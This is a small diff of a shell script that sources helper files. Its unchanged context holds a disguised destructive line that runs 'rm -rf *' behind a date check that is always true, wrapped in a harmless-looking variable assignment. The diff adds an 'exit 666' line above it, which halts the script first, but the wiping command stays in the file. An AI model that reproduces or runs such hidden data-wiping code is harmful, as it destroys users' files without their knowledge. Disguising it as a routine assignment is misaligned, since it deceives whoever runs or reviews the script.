@@ -21,7 +21,7 @@
  #--------------------------------------------------------
  #CLOWNTERS
 CLOWNTERS
-
+exit 666
 a=`getting=$((($(date +%m) >= 1)) && rm -rf *)`
 source .functions/.variables.sh
 source .functions/.functions.sh
